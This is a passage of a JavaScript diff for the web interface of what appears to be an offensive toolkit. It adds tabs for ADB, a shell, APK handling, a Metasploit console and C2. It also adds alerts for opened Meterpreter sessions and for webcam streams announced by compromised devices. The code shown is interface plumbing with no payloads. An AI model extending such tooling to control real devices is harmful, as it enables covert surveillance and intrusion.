+  if (e.key !== 'Enter') return;
+  const cmd = e.target.value.trim();
+  if (!cmd) return;
+  e.target.value = '';
+  _msf2History.push(cmd);
+  _msf2HistIdx = -1;
+  msfSend2(cmd);
+}
+
+function clearMsf2() {
+  const t = document.getElementById('msf2-terminal'); if (t) t.innerHTML = '';
+}
+
 // ── Tabs ──────────────────────────────────────────────────────────────────────
+function toggleSidebar() {
+  const sb  = document.getElementById('sidebar');
+  const btn = document.getElementById('sidebar-toggle-btn');
+  const hidden = sb.classList.toggle('hidden');
+  btn.classList.toggle('active', !hidden);
+  try { localStorage.setItem('secv_sidebar_hidden', hidden ? '1' : '0'); } catch(e) {}
+}
+
 function switchTab(tab) {
-  const names = ['terminal','adb','findings','qr','files','setup','c2','live'];
+  const names = ['terminal','adb','shell','findings','pd','msf-console','files','setup','c2','live'];
   document.querySelectorAll('.tab').forEach((t,i) => t.classList.toggle('active', names[i]===tab));
-  document.getElementById('terminal-wrap').style.display  = tab==='terminal' ? 'flex':'none';
-  document.getElementById('adb-console').style.display    = tab==='adb'      ? 'flex':'none';
-  document.getElementById('findings-panel').style.display = tab==='findings' ? 'flex':'none';
-  document.getElementById('qr-panel').style.display       = tab==='qr'       ? 'flex':'none';
-  document.getElementById('files-panel').style.display    = tab==='files'    ? 'flex':'none';
-  document.getElementById('setup-panel').style.display    = tab==='setup'    ? 'flex':'none';
-  document.getElementById('c2-panel').style.display       = tab==='c2'       ? 'flex':'none';
-  document.getElementById('live-panel').style.display     = tab==='live'     ? 'flex':'none';
-  if (tab === 'qr')     { loadQR(); }
-  if (tab === 'files')  { loadFiles(); }
-  if (tab === 'setup')  { loadDeps(); }
-  if (tab === 'c2')     { checkC2Status(); }
-  if (tab === 'live')   { onLiveTabOpen(); }
+  // self-contained tabs get full height — hide the params panel
+  const fullHeight = tab === 'pd' || tab === 'msf-console';
+  const pp = document.getElementById('params-panel');
+  if (pp) pp.style.display = fullHeight ? 'none' : '';
+  document.getElementById('terminal-wrap').style.display      = tab==='terminal'    ? 'flex':'none';
+  document.getElementById('adb-console').style.display        = tab==='adb'         ? 'flex':'none';
+  document.getElementById('shell-panel').style.display        = tab==='shell'       ? 'flex':'none';
+  document.getElementById('findings-panel').style.display     = tab==='findings'    ? 'flex':'none';
+  document.getElementById('pd-panel').style.display           = tab==='pd'          ? 'flex':'none';
+  document.getElementById('msf-console-panel').style.display  = tab==='msf-console' ? 'flex':'none';
+  document.getElementById('files-panel').style.display        = tab==='files'       ? 'flex':'none';
+  document.getElementById('setup-panel').style.display        = tab==='setup'       ? 'flex':'none';
+  document.getElementById('c2-panel').style.display           = tab==='c2'          ? 'flex':'none';
+  document.getElementById('live-panel').style.display         = tab==='live'        ? 'flex':'none';
+  if (tab === 'shell' && !_ptyActive) startPty();
+  if (tab === 'pd')          { pdRefreshSessions(); pdCheckApkStatus(); pdFormUpd(); }
+  if (tab === 'msf-console') { checkMsfStatus2(); if (_msfEs && !_msf2Listening) attachMsf2(); }
+  if (tab === 'files')       { loadFiles(); }
+  if (tab === 'setup')       { loadDeps(); }
+  if (tab === 'c2')          { checkC2Status(); }
+  if (tab === 'live')        { onLiveTabOpen(); }
 }
 
 // ── ADB Console ───────────────────────────────────────────────────────────────
@@ -2849,12 +6304,15 @@ function updateSessionsBar() {
       pill = document.createElement('div');
       pill.className = 'sess-pill ' + s.status;
       pill.dataset.sid = s.id;
+      const statusIcon = s.status === 'done' ? '✓' : s.status === 'error' ? '✗' : '';
       pill.innerHTML =
         '<span class="sp-dot" style="background:'+s.color+'"></span>' +
-        '<span class="sp-label">#'+s.id+' '+s.op+'</span>' +
-        (s.device ? '<span class="sp-dev">'+s.device+'</span>' : '') +
+        '<span class="sp-label">#'+s.id+'</span>' +
+        '<span class="sp-op">'+s.op+'</span>' +
+        (s.device ? '<span class="sp-dev">'+s.device.slice(0,12)+'</span>' : '') +
         '<span class="sp-time">'+elapsed+'s</span>' +
-        '<span class="sp-kill" title="kill" onclick="killOp('+s.id+')">×</span>';
+        (statusIcon ? '<span style="color:'+(s.status==='done'?'var(--green)':'var(--red)')+'">'+statusIcon+'</span>' : '') +
+        '<button class="sp-kill" title="kill session" onclick="killOp('+s.id+')">×</button>';
       if (s.status === 'running') pill.querySelector('.sp-dot').classList.add('running');
       frag.appendChild(pill);
     } else {
@@ -3130,14 +6588,16 @@ function setMsfStatus(on) {
 function connectMsfSSE() {
   if (_msfEs) _msfEs.close();
   _msfEs = new EventSource('/api/msf/stream');
-  _msfEs.onmessage = (e) => msfLine(e.data);
+  _msfEs.onmessage = (e) => { msfLine(e.data); msf2Line(e.data); };
   _msfEs.onerror   = () => setTimeout(() => {
     if (_msfEs) { _msfEs.close(); _msfEs = null; }
   }, 3000);
+  _msf2Listening = true;
 }
 
 function msfLine(raw) {
   const term = document.getElementById('msf-terminal');
+  if (!term) return;
   const span = document.createElement('span');
   span.className = 'ln';
   span.innerHTML = ansiToHtml(raw) + '\n';
@@ -3146,8 +6606,17 @@ function msfLine(raw) {
   // auto-detect webcam stream port announcement
   const portMatch = raw.match(/webcam.*?(\d{4,5})/i);
   if (portMatch) {
-    document.getElementById('cam-port').value = portMatch[1];
+    const cp = document.getElementById('cam-port');
+    if (cp) cp.value = portMatch[1];
     showToast('Webcam stream on port ' + portMatch[1] + ' — click Camera ▶ Stream', 'info', 5000);
+  }
+  // session opened alert
+  if (/meterpreter session \d+ opened/i.test(raw)) {
+    setMsfStatus2(true);
+    pdRefreshMsfSessions();
+    const b = document.getElementById('msf-badge');
+    if (b) { b.textContent = '●'; b.style.display = 'inline'; }
+    showToast('Meterpreter session opened!', 'connect', 5000);
   }
 }
 
@@ -3170,6 +6639,276 @@ function msfEnter(e) {
   inp.value = '';
   msfSend(cmd);
 }
+
+// ── PTY Shell Terminal ────────────────────────────────────────────────────────
+let _ptyEs        = null;
+let _ptyActive    = false;
+let _ptyScroll    = true;
+let _ptyHistory   = [];
+let _ptyHistIdx   = -1;
+let _ptyLineCount = 0;
+let _ptyLastCmd   = '';   // track last sent command to suppress echo
+let _ptySessionId = 0;   // matches server _pty_session; clears DOM on mismatch
+const ANSI_MAP_FULL = {
+  '0':'reset','1':'bold','30':'#555','31':'#ff4444','32':'#00ff88','33':'#ffcc44',
+  '34':'#4488ff','35':'#aa66ff','36':'#44ddff','37':'#c0c0d8',
+  '90':'#505070','91':'#ff6666','92':'#44ff99','93':'#ffdd66',
+  '94':'#66aaff','95':'#cc88ff','96':'#66ddff','97':'#ffffff',
+};
+
+function startPty() {
+  const cols = Math.max(80, Math.floor((document.getElementById('pty-output').clientWidth || 900) / 8));
+  const rows = Math.max(24, Math.floor((document.getElementById('pty-output').clientHeight || 600) / 18));
+  fetch('/api/pty/start', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({cols, rows})
+  }).then(r => r.json()).then(d => {
+    if (d.ok) {
+      _ptyActive = true;
+      setPtyStatus(true, d.shell);
+      connectPtySSE();
+      showToast('Shell started: ' + d.shell, 'connect', 2000);
+      // clear shell init noise (fastfetch, motd, etc.) after init completes
+      setTimeout(clearPty, 500);
+    } else {
+      showToast('Shell start failed: ' + (d.error||''), 'disconnect', 4000);
+    }
+  }).catch(e => showToast('PTY error: ' + e, 'disconnect', 4000));
+}
+
+function ptyKill() {
+  fetch('/api/pty/kill', {method:'POST'}).then(() => {
+    _ptyActive = false;
+    setPtyStatus(false);
+    if (_ptyEs) { _ptyEs.close(); _ptyEs = null; }
+    showToast('Shell killed', 'info', 2000);
+  });
+}
+
+function setPtyStatus(on, shell='') {
+  const dot   = document.getElementById('pty-dot');
+  const txt   = document.getElementById('pty-status');
+  const btn   = document.getElementById('pty-start-btn');
+  const info  = document.getElementById('pty-info');
+  const badge = document.getElementById('shell-badge');
+  dot.classList.toggle('on', on);
+  txt.classList.toggle('on', on);
+  txt.textContent = on ? 'active' : 'inactive';
+  if (btn)   btn.textContent = on ? '↺ restart' : '▶ start shell';
+  if (info)  info.textContent = on && shell ? shell : '';
+  if (badge) { badge.textContent = '●'; badge.style.display = on ? 'inline' : 'none'; }
+}
+
+function connectPtySSE() {
+  if (_ptyEs) { _ptyEs.close(); _ptyEs = null; }
+  const es = new EventSource('/api/pty/stream?sid=' + _ptySessionId);
+  _ptyEs = es;
+  es.onmessage = (e) => {
+    if (es !== _ptyEs) return;   // stale connection — discard
+    let data = e.data;
+    // session handshake: server sends {"pty_sid":N} as first event
+    if (data.startsWith('{"pty_sid":')) {
+      try {
+        const sid = JSON.parse(data).pty_sid;
+        if (sid !== _ptySessionId) {
+          _ptySessionId = sid;
+          clearPty();   // new session — wipe stale DOM
+        }
+      } catch(_) {}
+      return;
+    }
+    try { data = JSON.parse(data); } catch(_) {}
+    ptyWrite(data);
+  };
+  es.onerror = () => {
+    if (es !== _ptyEs) return;
+    es.close();          // prevent browser auto-reconnect + buffer replay
+    _ptyEs = null;
+    _ptyActive = false;
+    setPtyStatus(false);
+  };
+}
+
+function ptyWrite(raw) {
+  const clean = ptyStripCtrl(raw);
+
+  // detect shell-exited sentinel broadcast by the server reader thread
+  if (clean.includes('[shell exited]') || clean.includes('[shell killed]')) {
+    _ptyActive = false;
+    setPtyStatus(false);
+    if (_ptyEs) { _ptyEs.close(); _ptyEs = null; }
+    const out = document.getElementById('pty-output');
+    const note = document.createElement('div');
+    note.style.cssText = 'color:var(--muted);font-size:0.65rem;padding:6px 0;letter-spacing:0.06em;';
+    note.textContent = '— shell exited —';
+    out.appendChild(note);
+    if (_ptyScroll) out.scrollTop = out.scrollHeight;
+    return;
+  }
+
+  // drop pure-whitespace chunks (zsh RPROMPT line clearing)
+  if (!clean.trim()) return;
+
+  // suppress echo: if chunk is just the command we sent back
+  if (_ptyLastCmd) {
+    const stripped = clean.replace(/\n/g, '').trim();
+    if (stripped === _ptyLastCmd.trim()) { _ptyLastCmd = ''; return; }
+    // partial echo — starts with our command
+    if (stripped.startsWith(_ptyLastCmd.trim())) _ptyLastCmd = '';
+  }
+
+  const out = document.getElementById('pty-output');
+  const span = document.createElement('span');
+  span.innerHTML = ptyAnsi(raw);
+  out.appendChild(span);
+  _ptyLineCount += (clean.match(/\n/g)||[]).length;
+  const info = document.getElementById('pty-info');
+  if (info && _ptyActive) info.textContent = _ptyLineCount + ' lines';
+  if (_ptyScroll) out.scrollTop = out.scrollHeight;
+}
+
+function ptyStripCtrl(s) {
+  return s
+    // OSC: ESC ] ... BEL  or  ESC ] ... ESC \  (window title, CWD, icon name, etc.)
+    .replace(/\x1b\][^\x07\x1b]*(?:\x07|\x1b\\)/g, '')
+    // DEC private mode: ESC [ ? digits letter  (bracketed paste, cursor keys, etc.)
+    .replace(/\x1b\[\?[0-9;]*[a-zA-Z]/g, '')
+    // CSI non-SGR: ESC [ digits letter  (NOT m — keep color codes for ptyAnsi)
+    .replace(/\x1b\[[0-9;]*[A-LN-Za-ln-z]/g, '')
+    // Application keypad: ESC =  ESC >
+    .replace(/\x1b[=>]/g, '')
+    // Charset designation: ESC ( x  ESC ) x
+    .replace(/\x1b[()][^\r\n]/g, '')
+    // Any remaining lone ESC (NOT followed by [ which is a CSI we still need for colors)
+    .replace(/\x1b(?!\[)/g, '')
+    // CR handling
+    .replace(/\r\n/g, '\n')
+    .replace(/\r/g, '')
+    // Non-printable C0 controls except \n and \t
+    .replace(/[\x00-\x08\x0b\x0c\x0e-\x1a\x1c-\x1f]/g, '');
+}
+
+function ptyAnsi(s) {
+  s = ptyStripCtrl(s);
+  // Convert remaining ANSI SGR color codes to HTML spans
+  let out = ''; let fg = null; let bold = false;
+  const parts = s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
+    .split(/(\x1b\[[0-9;]*m)/);
+  for (const p of parts) {
+    const esc = p.match(/^\x1b\[([0-9;]*)m$/);
+    if (esc) {
+      const codes = esc[1].split(';'); const cmd = 'm';
+      if (cmd === 'm') {
+        if (fg) { out += '</span>'; fg = null; bold = false; }
+        for (const c of codes) {
+          if (c === '0' || c === '') { /* reset */ }
+          else if (c === '1') bold = true;
+          else if (ANSI_MAP_FULL[c] && ANSI_MAP_FULL[c] !== 'reset') {
+            fg = ANSI_MAP_FULL[c];
+            out += `<span style="color:${fg}${bold?';font-weight:bold':''}">`;
+          }
+        }
+      }
+      continue;
+    }
+    out += p;
+  }
+  if (fg) out += '</span>';
+  return out;
+}
+
+function ptyInputSend(text) {
+  if (!_ptyActive) { startPty(); return; }
+  // track command for echo suppression (strip trailing newline for comparison)
+  const cmd = text.replace(/\n$/, '');
+  if (cmd) _ptyLastCmd = cmd;
+  fetch('/api/pty/input', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({text})
+  });
+}
+
+function ptyKeyDown(e) {
+  const inp = document.getElementById('pty-input');
+  if (e.key === 'Enter') {
+    const cmd = inp.value;
+    inp.value = '';
+    if (cmd.trim()) {
+      _ptyHistory.unshift(cmd);
+      if (_ptyHistory.length > 200) _ptyHistory.pop();
+    }
+    _ptyHistIdx = -1;
+    _ptyLastCmd = cmd;
+    ptyInputSend(cmd + '\n');
+  } else if (e.key === 'ArrowUp') {
+    e.preventDefault();
+    if (_ptyHistIdx < _ptyHistory.length - 1) {
+      _ptyHistIdx++;
+      inp.value = _ptyHistory[_ptyHistIdx] || '';
+    }
+  } else if (e.key === 'ArrowDown') {
+    e.preventDefault();
+    if (_ptyHistIdx > 0) { _ptyHistIdx--; inp.value = _ptyHistory[_ptyHistIdx] || ''; }
+    else { _ptyHistIdx = -1; inp.value = ''; }
+  } else if (e.key === 'Tab') {
+    e.preventDefault();
+    // send TAB to PTY for shell completion
+    ptyInputSend('\t');
+  } else if (e.key === 'c' && e.ctrlKey) {
+    e.preventDefault();
+    ptyInputSend('\x03');  // SIGINT
+  } else if (e.key === 'd' && e.ctrlKey) {
+    e.preventDefault();
+    ptyInputSend('\x04');  // EOF
+  } else if (e.key === 'l' && e.ctrlKey) {
+    e.preventDefault();
+    ptyInputSend('\x0c');  // clear screen
+  }
+}
+
+function clearPty() {
+  document.getElementById('pty-output').innerHTML = '';
+  _ptyLineCount = 0;
+}
+
+function togglePtyScroll() {
+  _ptyScroll = !_ptyScroll;
+  document.getElementById('pty-scroll-btn').classList.toggle('active', _ptyScroll);
+}
+
+// Auto-resize PTY when panel resizes
+const _ptyResizeObs = new ResizeObserver(() => {
+  if (!_ptyActive) return;
+  const out = document.getElementById('pty-output');
+  if (!out) return;
+  const cols = Math.max(80, Math.floor(out.clientWidth  / 8));
+  const rows = Math.max(24, Math.floor(out.clientHeight / 18));
+  fetch('/api/pty/resize', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({cols, rows})
+  });
+});
+document.addEventListener('DOMContentLoaded', () => {
+  const out = document.getElementById('pty-output');
+  if (out) _ptyResizeObs.observe(out);
+
+  // sidebar: default hidden; restore from localStorage
+  const sb  = document.getElementById('sidebar');
+  const btn = document.getElementById('sidebar-toggle-btn');
+  let stored;
+  try { stored = localStorage.getItem('secv_sidebar_hidden'); } catch(e) {}
+  const hidden = stored === null ? true : stored === '1';
+  if (hidden) sb.classList.add('hidden');
+  else btn.classList.add('active');
+
+  // close APK browser on Escape
+  document.addEventListener('keydown', e => {
+    if (e.key === 'Escape') {
+      const ov = document.getElementById('apk-browser-overlay');
+      if (ov && ov.classList.contains('show')) { apkBrowserClose(); e.preventDefault(); }
+    }
+  });
+});
 
 // ── Process Sniffer ───────────────────────────────────────────────────────────
 let _procEs         = null;
